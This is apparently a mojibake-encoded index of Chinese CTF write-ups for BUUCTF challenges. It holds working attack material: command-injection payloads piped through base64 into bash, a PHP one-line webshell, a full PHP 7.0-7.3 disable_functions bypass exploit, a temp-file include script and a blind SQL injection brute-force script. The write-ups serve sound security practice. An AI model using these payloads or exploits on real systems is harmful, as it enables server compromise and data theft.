}\n```\n\næ˜¯è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥\n\n```cmake\nif($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n```\n\nçœ‹å¤§ä½¬åˆ†æunzipå‘½ä»¤å¦‚ä¸‹ï¼š\n\n```\nunzip -oq /WWW/d3cloud/storage/app/1.zip -d /WWW/d3cloud/storage/app/\n```\n\nç„¶ååˆ©ç”¨zipæ–‡ä»¶åå†™shell\n\n```\n1;echo bHMgLz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvbHMudHh0|base64 -\nd|bash;.zip\n```\n\nç®€å•è§£é‡Šä¸€ä¸‹ å°†`ls /`ç»“æœé‡å®šå‘åˆ°`/var/www/html/public/ls.txt`æ–‡ä»¶ä¸­\n\nè¿™é‡Œå¿…é¡»æœ‰æ¢è¡Œç¬¦ ä¸ç„¶å†™ä¸è¿›å…¥ ä¼°è®¡æ˜¯ä»£ç å®¡è®¡ä¸­æ–‡ä»¶åå¤„æœ‰è½¬ä¹‰æˆ–è€…åˆ«çš„æ“ä½œ é€šè¿‡æ¢è¡Œç»•è¿‡\n\nè¿˜æœ‰ä¸€ä¸ªç–‘é—®å°±æ˜¯å†™å…¥æ–‡ä»¶çš„è·¯å¾„æ˜¯æ€ä¹ˆè·å–çš„ï¼Ÿæ˜¯è‡ªå·±æ­ç¯å¢ƒå¼„åˆ°çš„å—qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002231725-7a1fab4c-f29d-4a0f-be37-d474d8df51bd.png)\n\nç›´æ¥è®¿é—®ls.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002436158-744f4590-d747-41ff-baa0-d4b3593bead9.png)\n\nç»§ç»­å’Œä¸Šé¢ä¸€æ ·çš„æ“ä½œ\n\n```\n1;echo Y2F0IC9mbDFBZz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvZmxhZy50eHQ=|base64 -\nd|bash;.zip\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002482821-010b80b2-9d7c-4f50-a51b-411008a3ac3b.png)\n\n### å°æ€»ç»“ä¸€ä¸‹ï¼š\n\nå¾ˆå¤šéš¾é¢˜è¿˜æ˜¯éœ€è¦è·å–åˆ°ç›¸å…³ç‰ˆæœ¬åï¼Œéœ€è¦è‡ªå·±æœ¬åœ°æ­å»ºå»è°ƒè¯•ï¼Œæ‰èƒ½æ…¢æ…¢å‘ç°æ¼æ´\n\nä»£ç å®¡è®¡èƒ½åŠ›å¾ˆé‡è¦qwq\n\n\n\n# å°¾å·´\n\nå…¶ä»–çš„wpéƒ½çœ‹ä¸æ‡‚ è¿˜æ˜¯æ…¢æ…¢æ¥å§\n\nçœ‹äº†ä¸€ä¸‹è¿™ç§çœŸæ­£éš¾çš„ctf å¤§å¤§çš„å¯„å†™åœ¨æˆ‘è„¸ä¸Š \n","tags":["å‘½ä»¤æ‰§è¡Œ"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-52-[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap","url":"/post/c93f1585.html","content":"\n[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap\n\n<!--more-->\n\nçœ‹é¢˜ç›®æ˜¯ä¸€é“å…³äºnmapçš„é¢˜ç›®\n\nè¯•è¯•127.0.0.1\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png)\n\nå†æ¥è¯•è¯•æˆ‘æœ¬åœ°kaliçš„nmap\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923143566-65b6630b-bc38-4280-a492-155645429f5a.png)\n\nå‡ ä¹æ˜¯ä¸€æ ·çš„ ä¼°è®¡å°±åªæ˜¯æ”¾äº†ä¸ªæ¥å£\n\n nmap å‘½ä»¤å¯ä»¥å°†æ‰«æç»“æœä¿å­˜åœ¨æ–‡ä»¶é‡Œé¢ \n\nå°±å¯ä»¥æƒ³åˆ°å†™ä¸€å¥è¯æœ¨é©¬ è¿™é‡Œå±è”½äº†php å¹¶ä¸” escapeshellarg()ä¸escapeshellcmd()å‡½æ•°å¤„ç†ä¿æŠ¤  ä¸ä¹‹å‰åšçš„æœ‰é“é¢˜ç›®å¾ˆç›¸ä¼¼\n\nå¯ä»¥ç”¨ç©ºæ ¼ä¸å•å¼•å·ç»•è¿‡\n\né€‰é¡¹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923628955-36f85d37-609e-4bee-b23f-63ef33cd4b38.png)\n\næœ€ç»ˆpayloadï¼š\n\n```\n' <?= @eval($_POST[1]);?> -oG a.phtml '\n```\n\nä¹‹årceå°±è¡Œäº†\n","tags":["nmap","esc***å‡½æ•°"],"categories":["buuctf"]},{"title":"buuctf-96-[GYCTF2020]EasyThinking","url":"/post/db3afe26.html","content":"\n[GYCTF2020]EasyThinking\n\n<!--more-->\n\nçœ‹æ ‡é¢˜æ˜¯ä¸€ä¸ªå…³äºthinkphpçš„æ¼æ´\n\nå…ˆéšä¾¿ä¹±è¾“ï¼Œå‘ç°æ˜¯thinkphp6\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050340127-2a4df26d-b7ea-4d7b-8d00-1b8d918cdfa7.png)\n\nä¸Šç½‘æŸ¥ä¸€ä¸‹æ¼æ´ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶åˆ›å»ºæ¼æ´ ï¼ˆå‚è€ƒï¼šhttps://www.anquanke.com/post/id/257485#h3-3ï¼‰\n\nå…ˆæ³¨å†Œä¸€ä¸ªè´¦å· ç„¶åç™»å½•æŠ“åŒ… ä¿®æ”¹phpsessidè¿™é‡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050525889-201d9ede-14f7-40f0-838c-a802991c0e86.png)\n\nè¿™é‡Œå¯ä»¥éšä¾¿è¾“å…¥ï¼Œç„¶åä¼šåœ¨`/runtime/session/sess_åˆšåˆšè¾“å…¥çš„32å­—ç¬¦`ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ \n\nè¿™é‡Œä¹‹åæˆ‘ä»¬è¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æœ€å¥½å°†å­—ç¬¦ä¸²è®¾ä¸ºå¸¦æœ‰phpåç¼€çš„æ–‡ä»¶\n\nç„¶ååœ¨æœç´¢è¿™é‡Œä¸Šä¼ æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050675837-fd4031ba-50f3-45b9-a53e-bc98875871ee.png)\n\nèšå‰‘è¿æ¥ `http://7f188c29-b095-4cdc-8aad-37aa4b61403f.node4.buuoj.cn:81/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`\n\ngetshellä¹‹åå‘ç°è¯»ä¸äº†flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050780538-11589c45-5e9d-4046-a790-d8377818edb7.png)\n\næŸ¥çœ‹phpinfo()ä¹‹åå‘ç°ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œåšåˆ°è¿™é‡Œå’Œä¹‹å‰buuæœ‰é“é¢˜ç›®å¾ˆåƒï¼Œæœ‰ä¸¤ç§åšæ³•\n\n## ç¬¬ä¸€ç§è§£æ³• èšå‰‘æ’ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051090942-b7882cf9-e5b3-44fe-b624-0506cf666fd1.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051116541-e04d75d7-5362-4bf1-8644-0e3123f7ce13.png)\n\n## ç¬¬äºŒç§è§£æ³•  ä¸Šä¼ ä¸€ä¸ªç»•è¿‡disable_functionsçš„è„šæœ¬  \n\nexpï¼š7.3çš„ç‰ˆæœ¬ è¿™é‡Œè¦æ³¨æ„phpç‰ˆæœ¬ ä¸åŒç‰ˆæœ¬å¯¹åº”çš„è„šæœ¬ä¸åŒ\n\n```php\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"/readflag\");\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n\n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\nå°†è¿™ä¸ªè„šæœ¬ä¸Šä¼ ä¸Šå» è¿™é‡Œæœ€å¥½æ˜¯åˆ° /var/tmp  æˆ–è€… /tmp è¿™ä¸¤ä¸ªè·¯å¾„æ˜¯ç”¨æˆ·ç”¨äºå­˜å‚¨ä¸´æ—¶æ€§çš„æ–‡ä»¶ï¼Œäº¦ç»å¸¸è¢«ç¨‹åºè¯»å†™ç”¨æˆ·å­˜å‚¨ä¸´æ—¶æ€§æ•°æ®ï¼Œæœ¬è´¨ä¸Šæ²¡åŒºåˆ«ï¼Œæ—¢ç„¶æ˜¯ç”¨æˆ·å­˜å‚¨ä¸´æ—¶æ€§æ•°æ®ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ˜¯æœ‰å†™æ–‡ä»¶æƒé™çš„ã€‚ \n\nå¯ä»¥åœ¨æˆ‘çš„centos7ä¸Šçœ‹çœ‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051771351-a93986bf-01f1-43c9-a09d-e42c37133783.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051825293-1ea88dd7-710f-4876-9de0-95c867ad2022.png)\n\nå¯ä»¥çœ‹åˆ°è¿™ä¸¤ç§è·¯å¾„çš„é»˜è®¤æƒé™æ˜¯777\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051303740-0e86adff-6bd1-4558-a103-ad3614348457.png)\n\nä¸Šä¼ æˆåŠŸ ä¹‹åå†å»åŒ…å«ä»–\n\næˆåŠŸ~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051469402-699b9232-eb82-451c-8e15-007bc3886685.png)\n","tags":["bypass","thinkphp"],"categories":["buuctf"]},{"title":"buuctf-91-[NPUCTF2020]ezinclude","url":"/post/da0771e5.html","content":"\n[NPUCTF2020]ezinclude\n\n<!--more-->\n\nä¸€é“phpæ–‡ä»¶ä¸´æ—¶åŒ…å«çš„é¢˜ç›®ï¼Œä¹‹å‰æ²¡è§è¿‡\n\nè¿›å…¥ä¹‹å æ ¹æ®æç¤º ç»™passä¼ ä¸€ä¸ªhashå€¼ å¯ä»¥æŠ“åŒ…çœ‹åˆ°\n\nç„¶åç›´æ¥åœ¨bpé‡Œæ“ä½œå°±è¡Œï¼Œä¸ç„¶ç½‘é¡µä¼šæŒ‘æˆ˜åˆ°ä¸€ä¸ª404ç½‘é¡µ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137425602-9e43ff11-ea0a-4d35-9bc4-e4b30806e036.png)\n\nå­˜åœ¨æ–‡ä»¶åŒ…å«\n\nä¸€èˆ¬è¿™ç§flagæ–‡ä»¶åç§°ä¼šè¢«æ”¹å†™æˆå¥‡å¥‡æ€ªæ€ªçš„å½¢å¼ï¼Œé çŒœæ˜¯çŒœä¸åˆ°çš„\n\nè¯»ä¸€ä¸‹å½“å‰é¡µé¢çš„æºç å§ ç”¨ä¸€ä¸‹ä¼ªåè®®\n\næ„é€ payloadï¼š`?file=php://filter/read=convert.base64-encode/resource=flflflflag.php`\n\nå‘ç°data input zipåè®®éƒ½è¢«æ²³èŸ¹äº† æ²¡åŠæ³•ç›´æ¥å‘½ä»¤æ‰§è¡Œ\n\næºç å¦‚ä¸‹\n\n```python\n<html>\n<head>\n<script language=\"javascript\" type=\"text/javascript\">\n           window.location.href=\"404.html\";\n</script>\n<title>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend</title>\n</head>\n<>\n<body>\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n</body>\n</html>\n```\n\næ‰«ä¸€ä¸‹ç½‘ç«™ å‘ç°è¿˜æœ‰config.php é‡Œé¢æ˜¯å‡çš„flag è¿˜æœ‰ä¸€ä¸ªdir.php\n\nå†…å®¹å¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137766612-8b1fa82f-df6a-4aa0-89e5-d0945ac1bf4f.png)\n\nå‘ç°è¿™ä¸ªæ–‡ä»¶å¯ä»¥å¸®æˆ‘ä»¬æ‰«/tmpçš„æ–‡ä»¶ç›®å½• è¿™ä¸ªç›®å½•æ˜¯å­˜å‚¨ç”¨æˆ·ä¸´æ—¶æ–‡ä»¶çš„åœ°æ–¹ æˆ‘ä»¬å¯¹ä»–æœ‰å†™æƒé™ \n\nè¿™é‡Œç”¨åˆ°äº† phpä¸´æ—¶æ–‡ä»¶åŒ…å«çš„æ¼æ´ å…·ä½“å‚è€ƒï¼ˆhttps://www.anquanke.com/post/id/201136#h2-11ï¼‰\n\nphp7.0çš„bugï¼š\n\n```\n?file=php://filter/string.strip_tags/resource=/etc/passwd\n```\n\nä½¿ç”¨`php://filter/string.strip_tags`å¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshell,è¿™ä¸ªå´©æºƒåŸå› æ˜¯å­˜åœ¨ä¸€å¤„ç©ºæŒ‡é’ˆå¼•ç”¨ã€‚\n\nè¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒã€‚\n\nâ€¢ php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤  \n\nâ€¢ php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤ \n\nâ€¢ php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤\n\nåˆ©ç”¨å¤§ä½¬ç°æˆçš„è„šæœ¬\n\n```python\nimport requests\nfrom io import BytesIO\nurl=\"http://5fd4afee-539c-424e-9b53-31cc89bbddf7.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\npayload=\"<?php phpinfo();?>\"\nfiles={\n    \"file\":BytesIO(payload.encode())\n}\nr=requests.post(url=url,files=files,allow_redirects=False)\n\n\nprint(r.text)\n```\n\nä¹‹åå†å»çœ‹çœ‹dir.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137989466-9f670370-e4b0-47fe-a73d-978c28304509.png)\n\nå‘ç°æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ \n\nå†å»åŒ…å«ä¸€ä¸‹æˆ‘ä»¬çš„æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681138061207-03a37f3f-f1cd-4103-9530-a59e235d7fe0.png)\n","tags":["phpä¸´æ—¶æ–‡ä»¶åŒ…å«"],"categories":["buuctf"]},{"title":"buuctf-90-[NCTF2019]SQLi","url":"/post/4f5e876.html","content":"\n[NCTF2019]SQLi\n\n<!--more-->\n\nsqlæ³¨å…¥ fuzzä¸€ä¸‹å‘ç°å±è”½äº†å¾ˆå¤šçš„sqlå¸¸ç”¨å‘½ä»¤\n\næ‰«æœåŠ¡å™¨åå°å‘ç°hint.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030820273-63312165-e4dd-489c-8d16-4d6a50608be8.png)\n\nä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬è·å¾—adminçš„å¯†ç æ—¶ï¼Œå°±èƒ½è·å¾—flagï¼Œè¿adminéƒ½è¢«é»‘åå•äº†ï¼Œæ˜¾ç„¶æ˜¯ä¸æƒ³è®©æˆ‘ä»¬é€šè¿‡å¸¸ç”¨çš„æ‰‹æ®µå»æ³¨å…¥\n\nå›åˆ°ä¸»é¡µçœ‹åˆ°ä»–å·²ç»ç»™äº†æˆ‘ä»¬ç³»ç»Ÿçš„æŸ¥è¯¢è¯­å¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030986280-e33b949b-5625-4741-be44-78bb74245b06.png)\n\nè¿™é‡Œæ˜¯ä¸æ˜¯å°±èƒ½æƒ³åˆ°é€šè¿‡å·§å¦™çš„é—­åˆæ”¹å˜æŸ¥è¯¢è¯­å¥ä½¿å¾—æˆ‘ä»¬çš„æ¶æ„æ³¨å…¥è¯­å¥å°±èƒ½è¢«è°ƒç”¨\n\nçœ‹äº†å¤§ä½¬çš„wpå‘ç°æ˜¯æ­£åˆ™æ³¨å…¥ regexp\n\næœ¬åœ°æµ‹è¯•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681031145077-b7064c79-5562-4128-994e-bb74b5ef25a1.png)\n\nèƒ½çœ‹å‡ºæ— è®ºusernameçš„å†…å®¹æ˜¯å¦åœ¨è¿™ä¸ªè¡¨å•ä¸­ï¼Œå› ä¸ºæœ‰`||`ï¼ˆç›¸å½“äºé€»è¾‘æˆ–ï¼‰\n\nå½“`password=\"^1\"`ä¹Ÿå°±æ˜¯ä»¥1å¼€å¤´ ä¹‹åä»¥12å¼€å¤´ï¼Œåˆ©ç”¨è¿™æ ·çš„æ­£åˆ™åŒ¹é…å»ä¸€ä½ä¸€ä½çš„è¯•æ¢ï¼Œæ€è·¯ç±»ä¼¼äºå¸ƒå°”ç›²æ³¨ï¼Œæ ¹æ®å›æ˜¾æ¥åˆ¤æ–­ã€‚\n\nå›åˆ°é¢˜ç›®ï¼Œåº”è¯¥æ€ä¹ˆæ„é€ å‘¢\n\né¢˜ç›®sqlé‡Œçš„æŸ¥è¯¢è¯­å¥ä¸ºï¼š\n\n```\nselect * from users where username='' and passwd=''\n```\n\nå¯ä»¥æ„é€ `username=\\&passwd=||sql;%00`  ç©ºæ ¼è¢«æ²³èŸ¹äº†å¯ä»¥ç”¨`/**/`ç»•è¿‡  æ³¨é‡Šç¬¦`# --`\n\n`%00`æ¥ç»•è¿‡æœ¬è´¨ä¸Šæ˜¯æˆªæ–­ è¿™é‡Œæœ«å°¾çš„å°å·å®é™…ä¸Šæ˜¯sqlè¯­å¥é‡Œçš„\n\nå› ä¸ºå¾ˆå¤šç¨‹åºåº•å±‚éƒ½æ˜¯cè¯­è¨€ç¼–è¯‘çš„ï¼Œcè¯­è¨€å¯¹äºä¸€ä¸ªå­—ç¬¦ä¸²åˆ°æœ«å°¾çš„æ ‡è¯†æ˜¯æ˜¯å¦æ£€æµ‹åˆ°`\\0`ç»è¿‡urlåŠ å¯†åå³ä¸º`%00`\n\næ”¾å…¥åŸè¯­å¥åä¸ºï¼š`select * from users where username='\\' and passwd='||sql;%00'`\n\nç›¸å½“äºusernameä¸­çš„è¯­å¥ä¸º`' and passwd =`å†…å®¹ä¸é‡è¦ ç„¶åé€»è¾‘æˆ– åŠ ä¸Šæˆ‘ä»¬çš„sqlæ³¨å…¥çš„æ¶æ„è¯­å¥\n\n```\nusername=\\&passwd=||/**/passwd/**/regexp/**/\"^{}\";%00\n```\n\nå¦‚æœå›æ˜¾æ­£å¸¸ä¸ºä¼šå®šå‘åˆ°welcome.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681033291490-4106c873-7f0f-4dc4-930a-176e216861db.png)\n\næ ¹æ®æ€è·¯å†™å‡ºè„šæœ¬\n\n```python\nimport requests\nfrom urllib import parse\nimport string\nurl = 'http://16b0c2ee-be28-47f4-8454-b6a04a23aa8f.node4.buuoj.cn:81/index.php'\nresult = ''\ndictionary = string.ascii_lowercase + string.digits + '_' #çˆ†ç ´å­—å…¸\nfor i in range (1,35):\n    for j in dictionary:\n        payload = {\n            \"username\":\"\\\\\",   #è¿™é‡Œéœ€è¦è½¬ä¹‰ä¸€ä¸‹\n            \"passwd\":\"||/**/passwd/**/regexp/**/\\\"^{}\\\";{}\".format((result+j),parse.unquote(\"%00\"))\n        }\n        r = requests.post(url,data=payload)\n        if \"welcome\" in r.text:\n            result+=j\n            break\n    print(result)\n```\n\nè¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼šå¦‚æœåœ¨ç™»å½•æ¡†é‡Œé¢æ•²%00 é‚£æ ·ä¼šå¯¼è‡´%00è¢«è½¬ä¹‰è€Œå¤±å»ä½œç”¨ åœ¨pythonè„šæœ¬é‡Œé¢ æˆ‘ä»¬ç”¨parse.unquote('%00')è¡¨ç¤ºä¸è¿›è¡Œè½¬ä¹‰çš„%00 è¿™æ ·å°±èƒ½çˆ†å‡ºå¯†ç   \n","tags":["sqlæ³¨å…¥","sql bypass","sqlæ­£åˆ™æ³¨å…¥"],"categories":["buuctf"]},{"title":"buuctf-88-[ç½‘é¼æ¯ 2018]Comment","url":"/post/3a0e9ae9.html","content":"\n[ç½‘é¼æ¯ 2018]Comment\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“å…³äºsqläºŒæ¬¡æ³¨å…¥çš„é¢˜ç›® ç¬¬ä¸€æ¬¡é‡åˆ°äºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®è›®ä¸é”™\n\nè¿›å…¥ä¹‹åï¼Œæ˜¯ä¸€ä¸ªç±»ä¼¼äºç•™è¨€æ¿çš„ç•Œé¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456616603-81a091fd-c756-4579-9d71-8352ed648e24.png)\n\néœ€è¦å…ˆç™»å½• ç„¶åå½¢å¼æ˜¯å¯†ç æœ€åä¸‰ä½çº¯æ•°å­—ä¸çŸ¥é“ é€šè¿‡bpçˆ†ç ´ä¸€ä¸‹å°±å‡ºæ¥äº† å¯†ç ç»“å°¾æ˜¯666\n\nè¿›å…¥ä¹‹åf12\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456702395-d52c4662-22f7-4655-af63-fa9d6fc43792.png)\n\nå‘ç°æç¤º å­˜åœ¨gitæºç æ³„éœ²çš„\n\nç›´æ¥ä¸Šgithack\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456816678-f2f3e1ca-7c33-420e-ba91-40677e6f3b1c.png)\n\nå‘ç°æºç \n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    break;\ncase 'comment':\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\nä½†æ˜¯å‘ç°æºç ä¸å…¨ \n\nç”¨`git log`æˆ–è€… `git log --reflog`æ‰¾åˆ°åŸæ¥çš„ä»£ç ç„¶åæ¢å¤\n\nä½†æ˜¯æˆ‘è¿™é‡Œæ²¡æœ‰å¤ç°æˆåŠŸ ä¸€ç›´æŠ¥é”™ 